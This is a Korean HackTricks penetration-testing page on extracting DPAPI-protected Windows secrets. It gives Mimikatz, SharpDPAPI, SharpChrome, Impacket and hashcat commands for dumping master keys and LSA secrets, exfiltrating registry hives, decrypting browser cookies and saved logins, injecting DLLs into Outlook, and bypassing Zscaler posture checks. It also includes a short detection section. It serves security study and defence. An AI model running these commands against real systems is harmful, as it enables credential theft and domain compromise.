# DPAPI - Extracting Passwords

{{#include ../../banners/hacktricks-training.md}}



## DPAPI란 무엇인가

Data Protection API(DPAPI)는 주로 Windows 운영 체제에서 **비대칭 private key를 대칭 암호화**하는 데 사용되며, 사용자 또는 시스템 secret을 중요한 entropy 원천으로 활용합니다. 이 방식은 사용자의 logon secret에서 파생된 key를 사용해 데이터를 암호화하거나, 시스템 암호화의 경우 시스템의 domain authentication secret을 사용해 데이터를 암호화할 수 있도록 하여 개발자가 encryption key 자체의 보호를 관리할 필요를 없애므로 암호화를 단순화합니다.

DPAPI를 사용하는 가장 일반적인 방법은 **`CryptProtectData` 및 `CryptUnprotectData`** 함수를 이용하는 것입니다. 이 함수들은 현재 logon된 process의 security context를 사용해 애플리케이션이 데이터를 암호화하고 복호화할 수 있도록 합니다. 기본적으로 데이터는 해당 데이터를 암호화한 동일한 사용자 또는 시스템 context에서만 복호화할 수 있습니다.<sup>[[2]](#references)[[3]](#references)</sup>

이 함수들은 암호화 및 복호화 중에 사용되는 선택적 **entropy parameter**도 허용합니다. 선택적 entropy로 보호된 데이터를 복호화하려면 동일한 entropy 값이 필요합니다.<sup>[[2]](#references)[[6]](#references)</sup>

### 사용자 key 생성

DPAPI는 사용자의 credential에서 사용자별 값을 파생합니다. 정확한 파생 방식은 account와 operating-system version에 따라 달라집니다. 예를 들어 Impacket은 password의 SHA-1 digest를 기반으로 하는 HMAC-SHA1 경로, password의 MD4/NT hash를 기반으로 하는 또 다른 경로, 그리고 Protected Users를 위한 PBKDF2-SHA256 파생 경로를 시도합니다. 따라서 offline tooling은 plaintext password 또는 사용 가능한 NT hash 중 하나로부터 필요한 material을 파생할 수 있습니다.<sup>[[2]](#references)[[10]](#references)</sup>

이는 공격자가 사용자의 password hash를 획득할 수 있는 경우 다음을 수행할 수 있기 때문에 특히 중요합니다.

- 해당 사용자의 key로 **DPAPI를 사용해 암호화된 모든 데이터를 복호화**할 수 있으며 API에 연결할 필요가 없습니다.
- 유효한 DPAPI key를 생성할 수 있는지 확인하면서 offline에서 **password cracking**을 시도할 수 있습니다.

DPAPI는 보호된 각 blob마다 새로운 master key를 생성하는 대신, 각 사용자에 대해 하나 이상의 **master key**를 유지합니다. 각 master key에는 **GUID**(Globally Unique Identifier)가 있으며, 암호화된 blob에는 해당 blob을 보호하는 master key가 기록되어 있습니다.<sup>[[2]](#references)</sup>

Master key는 **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** directory에 저장되며, 여기서 `{SID}`는 사용자의 Security Identifier입니다. Master-key file에는 사용자의 **pre-key**로 보호되는 material과 domain 사용자의 경우 **domain backup key**로 보호되는 recovery material이 포함됩니다.<sup>[[2]](#references)</sup>

**master key를 암호화하는 데 사용되는 domain key는 domain controllers에 있으며 절대 변경되지 않는다**는 점에 유의해야 합니다. 따라서 공격자가 domain controller에 access할 수 있다면 domain backup key를 가져와 해당 domain의 모든 사용자의 master key를 복호화할 수 있습니다.<sup>[[2]](#references)</sup>

암호화된 blob의 header에는 해당 데이터의 암호화에 사용된 **master key의 GUID**가 포함됩니다.

> [!TIP]
> DPAPI encrypted blobs starts with **`01 00 00 00`**

Find master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
다음은 사용자의 여러 Master Keys가 어떻게 보이는지 보여주는 예입니다:

![DPAPI란 무엇인가 - Users key generation: 사용자의 여러 Master Keys는 다음과 같이 보입니다](<../../images/image (1121).png>)

### Machine/System key generation

이 키는 machine이 데이터를 암호화하는 데 사용됩니다. **DPAPI_SYSTEM LSA secret**을 기반으로 하며, 이는 SYSTEM user만 액세스할 수 있는 특수한 키입니다. 이 키는 machine-level credentials 또는 system-wide secrets와 같이 system 자체에서 액세스해야 하는 데이터를 암호화하는 데 사용됩니다.<sup>[[2]](#references)</sup>

이러한 키에는 **domain backup이 없으므로** 로컬에서만 액세스할 수 있습니다:

- **Mimikatz**는 다음 명령을 사용하여 LSA secrets를 dump함으로써 이 키에 액세스할 수 있습니다: `mimikatz lsadump::secrets`
- secret은 registry 내부에 저장되므로, administrator는 **액세스할 수 있도록 DACL permissions을 수정할 수 있습니다**. registry path는 다음과 같습니다: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- registry hives에서 offline extraction을 수행하는 것도 가능합니다. 예를 들어 target에서 administrator 권한으로 hives를 저장하고 exfiltrate합니다:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
그런 다음 analysis box에서 hives로부터 DPAPI_SYSTEM LSA secret을 복구하고, 이를 사용해 machine-scope blobs(예약된 작업의 passwords, service credentials, Wi-Fi profiles 등)를 decrypt합니다:
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
Veeam-specific DPAPI 예시:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

### DPAPI로 보호되는 데이터

DPAPI로 보호되는 personal data에는 다음이 포함됩니다:

- Windows creds
- Internet Explorer 및 Google Chrome의 passwords와 auto-completion data
- Outlook 및 Windows Mail과 같은 애플리케이션의 E-mail 및 internal FTP account passwords
- shared folders, resources, wireless networks 및 Windows Vault의 passwords와 encryption keys
- remote desktop connections, .NET Passport 및 다양한 encryption과 authentication 용도의 private keys passwords
- Credential Manager로 관리되는 network passwords와 Skype, MSN messenger 등 CryptProtectData를 사용하는 애플리케이션의 personal data
- register 내부의 encrypted blobs
- ...

System으로 보호되는 데이터에는 다음이 포함됩니다:
- Wifi passwords
- Scheduled task passwords
- ...

### Master key extraction options

- 사용자에게 domain admin privileges가 있는 경우 **domain backup key**에 액세스하여 해당 domain의 모든 user master keys를 decrypt할 수 있습니다:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- 로컬 관리자 권한이 있으면 **LSASS memory에 access**하여 연결된 모든 사용자의 DPAPI master keys와 SYSTEM key를 extract할 수 있습니다.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- 사용자가 local admin privileges를 가지고 있으면 **DPAPI_SYSTEM LSA secret**에 액세스하여 machine master keys를 복호화할 수 있습니다:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- 사용자의 password 또는 NTLM hash를 알고 있다면 **사용자의 master keys를 직접 decrypt할 수 있습니다**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- 사용자로 세션에 들어가 있다면 **RPC를 사용하여 마스터 키를 복호화하기 위한 백업 키를 DC에 요청**할 수 있습니다. 로컬 관리자이고 해당 사용자가 로그인되어 있다면, 이를 위해 **사용자의 세션 토큰을 탈취**할 수 있습니다:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Vault 목록화
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## DPAPI 암호화 데이터 액세스

### DPAPI 암호화 데이터 찾기

일반적으로 사용자 **files protected**는 다음 위치에 있습니다:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- 위 경로에서 `\Roaming\`을 `\Local\`로 변경한 경로도 확인합니다.

열거 예시:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)는 파일 시스템, 레지스트리 및 B64 blobs에서 DPAPI 암호화 blobs를 찾을 수 있습니다:<sup>[[12]](#references)</sup>
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
동일한 repo의 [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI)를 사용하면 cookies와 같은 DPAPI 보호 sensitive data를 decrypt할 수 있습니다.<sup>[[12]](#references)</sup>

#### Chromium/Edge/Electron 빠른 레시피 (SharpChrome)

- 현재 user, 저장된 logins/cookies의 interactive decryption (user context에서 실행할 때 사용자의 Credential Manager에서 추가 키를 확인하므로 Chrome 127+의 app-bound cookies에서도 작동):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- 파일만 가지고 있는 경우의 Offline analysis. 먼저 profile의 "Local State"에서 AES state key를 추출한 다음, 이를 사용해 cookie DB를 복호화합니다:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- DPAPI 도메인 백업 키(PVK)와 대상 호스트에 대한 admin 권한이 있을 때의 도메인 전체/원격 트리아지:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- 사용자의 DPAPI prekey/credkey(LSASS에서 가져온 것)가 있다면 password cracking을 건너뛰고 프로필 데이터를 직접 decrypt할 수 있습니다:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
참고
- 최신 Chrome/Edge 빌드에서는 특정 cookies를 "App-Bound" encryption으로 저장할 수 있습니다. 추가 app-bound key 없이는 해당 cookies를 offline decryption할 수 없습니다. 이를 자동으로 가져오려면 target user context에서 SharpChrome을 실행하세요. 아래에 참조된 Chrome security blog post를 확인하세요.<sup>[[5]](#references)</sup>

### 액세스 키 및 데이터

- **SharpDPAPI 사용** 현재 session의 DPAPI encrypted files에서 credentials를 가져옵니다:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **자격 증명 정보 가져오기**: 암호화된 데이터와 guidMasterKey 등.<sup>[[3]](#references)</sup>
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **masterkey에 접근**:

RPC를 사용하여 **domain backup key**를 요청하는 사용자의 masterkey를 복호화합니다:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
**SharpDPAPI** 도구는 마스터키 복호화를 위해 다음 인자도 지원합니다(`/rpc`를 사용해 도메인 백업 키를 가져오거나, `/password`를 사용해 평문 password를 지정하거나, `/pvk`를 사용해 DPAPI 도메인 private key 파일을 지정할 수 있다는 점에 주목하세요...):<sup>[[12]](#references)</sup>
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **masterkey를 사용하여 데이터 복호화**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
**SharpDPAPI** tool은 `credentials|vaults|rdg|keepass|triage|blob|ps` 복호화를 위해 다음 인자도 지원합니다(`/rpc`를 사용해 도메인의 backup key를 가져오고, `/password`를 사용해 plaintext password를 사용하며, `/pvk`를 사용해 DPAPI 도메인 private key 파일을 지정하고, `/unprotect`를 사용해 현재 사용자의 session을 사용하는 것이 가능하다는 점에 유의하세요...):<sup>[[12]](#references)</sup>
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- DPAPI prekey/credkey 직접 사용하기 (password 불필요)

LSASS를 dump할 수 있다면 Mimikatz는 plaintext password를 몰라도 사용자의 masterkeys를 decrypt하는 데 사용할 수 있는 logon별 DPAPI key를 노출하는 경우가 많습니다. 이 값을 도구에 직접 전달하세요:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- **현재 사용자 세션**을 사용하여 일부 데이터를 복호화:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Impacket dpapi.py를 사용한 Offline decryption

victim user의 SID와 password(또는 NT hash)를 알고 있다면 Impacket의 dpapi.py를 사용하여 DPAPI masterkeys와 Credential Manager blobs를 완전히 offline에서 decrypt할 수 있습니다.<sup>[[10]](#references)[[11]](#references)</sup>

- 디스크에서 artefacts 식별:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- 일치하는 masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- file transfer tooling이 불안정한 경우, on-host에서 파일을 base64로 인코딩한 후 출력을 복사합니다:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- 사용자의 SID와 password/hash를 사용하여 masterkey를 복호화합니다:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- 복호화된 masterkey를 사용하여 credential blob을 복호화합니다:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
이 workflow는 Windows Credential Manager를 사용하는 앱에 저장된 domain credentials를 자주 복구하며, administrative accounts(예: `*_adm`)도 포함됩니다.

---

### Optional Entropy("Third-party entropy") 처리

일부 애플리케이션은 `CryptProtectData`에 추가 **entropy** 값을 전달합니다. 이 값이 없으면 올바른 masterkey를 알고 있더라도 blob을 decrypt할 수 없습니다. 따라서 이러한 방식으로 보호된 credentials(예: Microsoft Outlook 및 일부 VPN clients)를 대상으로 할 때는 entropy를 확보하는 것이 필수적입니다.

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture)(2022)는 target process 내부의 DPAPI functions에 hook을 설치하고 전달되는 모든 optional entropy를 투명하게 기록하는 user-mode DLL입니다. `outlook.exe` 또는 `vpnclient.exe`와 같은 processes를 대상으로 **DLL-injection** mode에서 EntropyCapture를 실행하면 각 entropy buffer를 calling process 및 blob에 매핑한 file이 출력됩니다. 캡처한 entropy는 이후 **SharpDPAPI**(`/entropy:`) 또는 **Mimikatz**(`/entropy:<file>`)에 제공하여 data를 decrypt하는 데 사용할 수 있습니다.<sup>[[6]](#references)</sup>
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft는 Windows 10 v1607 (2016)부터 **context 3** masterkey 형식을 도입했습니다. `hashcat` v6.2.6 (2023년 12월)은 hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1), **22102** (context 3)를 추가하여 masterkey 파일에서 직접 사용자 passwords를 GPU-accelerated cracking할 수 있도록 했습니다. 따라서 attackers는 target system과 상호작용하지 않고도 word-list 또는 brute-force attacks를 수행할 수 있습니다.<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024)은 이 process를 자동화합니다:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
이 도구는 Credential 및 Vault blobs를 parse하고, cracked keys로 이를 decrypt한 후 cleartext passwords를 export할 수도 있습니다.<sup>[[8]](#references)</sup>


### 다른 machine 데이터에 액세스

**SharpDPAPI 및 SharpChrome**에서는 **`/server:HOST`** 옵션을 지정하여 remote machine의 데이터에 액세스할 수 있습니다. 물론 해당 machine에 액세스할 수 있어야 하며, 다음 예제에서는 **domain backup encryption key가 알려져 있다고** 가정합니다:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## 기타 도구

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB)는 LDAP directory에서 모든 users와 computers를 자동으로 추출하고 RPC를 통해 domain controller backup key를 추출하는 tool입니다. 그런 다음 script는 모든 computers의 IP address를 확인하고, 모든 computers에서 smbclient를 실행하여 모든 users의 DPAPI blobs를 가져온 후 domain backup key로 모든 항목을 decrypt합니다.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP에서 추출한 computers list를 사용하면 미리 알지 못했던 모든 sub network도 찾을 수 있습니다!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI)는 DPAPI로 보호된 secrets를 자동으로 dump할 수 있습니다. 2.x release에서는 다음 기능이 추가되었습니다:<sup>[[9]](#references)</sup>

* 수백 개 host에서 blobs를 parallel collection
* **context 3** masterkeys parsing 및 자동 Hashcat cracking integration
* Chrome "App-Bound" encrypted cookies 지원(다음 section 참조)
* endpoint를 반복적으로 poll하고 새로 생성된 blobs를 diff하는 새로운 **`--snapshot`** mode

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop)는 masterkey/credential/vault files용 C# parser로, Hashcat/JtR formats를 output하고 선택적으로 cracking을 자동으로 실행할 수 있습니다. Windows 11 24H1까지 machine 및 user masterkey formats를 완전히 지원합니다.<sup>[[8]](#references)</sup>


## 일반적인 탐지

- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` 및 기타 DPAPI 관련 directories의 files에 대한 access.
- 특히 **C$** 또는 **ADMIN$**와 같은 network share에서 발생하는 access.
- LSASS memory에 access하거나 masterkeys를 dump하기 위해 **Mimikatz**, **SharpDPAPI** 또는 유사한 tooling 사용.
- Event **4662**: *An operation was performed on an object* – **`BCKUPKEY`** object에 대한 access와 연관 지을 수 있습니다.
- process가 *SeTrustedCredManAccessPrivilege* (Credential Manager)를 요청할 때 발생하는 Event **4673/4674**

---
### 2023-2025 vulnerabilities 및 ecosystem changes

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (2023년 11월). Network access 권한이 있는 attacker는 domain member가 malicious DPAPI backup key를 가져오도록 속일 수 있으며, 이를 통해 user masterkeys를 decrypt할 수 있습니다. 2023년 11월 cumulative update에서 patch되었으므로 administrators는 DC와 workstations가 최신 patch 상태인지 확인해야 합니다.<sup>[[4]](#references)</sup>
* **Chrome 127 “App-Bound” cookie encryption** (2024년 7월)은 legacy DPAPI-only protection을 user의 **Credential Manager**에 저장되는 추가 key로 대체했습니다. 이제 cookies를 offline decrypt하려면 DPAPI masterkey와 **GCM-wrapped app-bound key**가 모두 필요합니다. SharpChrome v2.3 및 DonPAPI 2.x는 user context로 실행할 때 추가 key를 recover할 수 있습니다.<sup>[[5]](#references)</sup>


### Case Study: Zscaler Client Connector – SID에서 파생된 Custom Entropy

Zscaler Client Connector는 `C:\ProgramData\Zscaler` 아래에 여러 configuration files(예: `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`)를 저장합니다. 각 file은 **DPAPI (Machine scope)**로 encrypted되지만, vendor는 disk에 저장하는 대신 *runtime에 계산되는* **custom entropy**를 제공합니다.<sup>[[1]](#references)</sup>

entropy는 두 요소로부터 다시 생성됩니다.

1. `ZSACredentialProvider.dll` 내부에 embedded된 hard-coded secret.
2. configuration이 속한 Windows account의 **SID**.

DLL에 구현된 algorithm은 다음과 동일합니다.
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
secret이 디스크에서 읽을 수 있는 DLL에 포함되어 있으므로, **SYSTEM 권한을 가진 모든 로컬 공격자는 어떤 SID에 대해서든 entropy를 재생성하고 blob을 오프라인에서 복호화할 수 있습니다.**
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
복호화하면 모든 **device posture check**와 예상 값이 포함된 완전한 JSON configuration이 생성됩니다. 이는 client-side bypasses를 시도할 때 매우 유용한 정보입니다.

> TIP: 다른 암호화된 artefact(`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`)는 entropy 없이(`16`개의 0 바이트) DPAPI로 보호됩니다. 따라서 SYSTEM privileges를 획득하면 `ProtectedData.Unprotect`를 사용해 직접 복호화할 수 있습니다.

## References

- [1] [Synacktiv – zero trust를 신뢰해야 하는가? Zscaler posture checks 우회](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [DPAPI Secrets. DPAPI의 보안 분석 및 데이터 복구](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Mimikatz와 C++를 사용한 DPAPI 암호화 Secret 읽기](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Windows DPAPI (Data Protection Application Programming Interface) Spoofing Vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Windows에서 Chrome cookies의 보안 개선](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: DPAPI Optional Entropy의 간단한 추출](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [hashcat v6.2.6 릴리스 노트](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – GitHub 저장소](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – PyPI 프로젝트 페이지](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking 및 DPAPI decryption을 통한 DC admin 권한 획득](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – 사용법 및 옵션](https://github.com/GhostPack/SharpDPAPI)
{{#include ../../banners/hacktricks-training.md}}
